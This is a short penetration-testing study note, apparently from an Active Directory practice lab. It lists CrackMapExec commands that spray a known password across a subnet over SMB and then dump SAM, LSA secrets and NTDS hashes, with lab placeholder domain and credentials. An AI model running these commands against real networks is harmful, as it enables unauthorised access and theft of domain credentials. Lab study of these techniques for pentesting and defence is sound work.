- - -
## Explaination : 

![Imgur](https://i.imgur.com/Eem23wJ.png)

![Imgur](https://i.imgur.com/IgJe7oo.jpg)

- - -
## Attacking Steps : {ssh,ldap,mssql,smb,winrm}: 

#### If you know the Password : 

```bash
cme smb 10.10.10.0/24 -u Thor -d Marvel.local  -p Password1 
cme smb 10.10.10.0/24 -u Thor -d Marvel.local  -p Password1 --local-auth 
```

Then use this : [[_Active Directory/Gaining Shells/Basic]]

#### Must Try ( Sometimes works Maybe you got Lucky ) : 

```sh
cme smb 10.10.10.0/24 -u Thor -d Marvel.local -p Password1 --sam
cme smb 10.10.10.0/24 -u Thor -d Marvel.local -p Password1 --lsa
cme smb 10.10.10.0/24 -u Thor -d Marvel.local -p Password1 --ntds
cme smb 10.10.10.0/24 -u Thor -d Marvel.local -p Password1 --ntds-history
```


- - - 

